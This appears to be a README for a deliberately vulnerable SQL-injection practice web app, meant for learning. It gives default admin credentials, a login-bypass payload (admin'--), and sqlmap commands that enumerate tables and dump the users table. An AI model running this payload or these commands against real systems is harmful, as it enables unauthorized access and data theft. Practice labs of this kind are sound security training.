# SQL-Injection-Lab
SQL Injection Web App For Practices and Learning Purpose

# Requirement
- Python 3.11 or Above
- Laptop
- Internet Connection

# How to Start Server

- Step.1: Type in Cmd `python sql.py`
- Step.2 Open Browser And Type `yourip:5000`
- Step.3 Admin Login Info `admin:admin123`
- Step.4 Use Sql Payload `admin'--` any password

# How to Attack Server
- Step.1: Capture Post Response and Create A File `req.txt`
- Step.2 use Sqlmap for find tables `sqlmap --risk=3 --level=5 --tables --batch`
- Step.3 Now final Dump Entire Databse `sqlmap --risk=3 --level=5 -T users --dump --batch`

# Watch Video For More Information.
[![YouTube Video](https://img.youtube.com/vi/GDlxrAV2v2k/0.jpg)](https://www.youtube.com/watch?v=GDlxrAV2v2k)

# Check Out More [Hacking Course](https://linuxndroid.in)

<br>
<p align="center">Made with ❤️ By <a href="https://www.youtube.com/channel/UC2O1Hfg-dDCbUcau5QWGcgg">Linuxndroid</a></p>
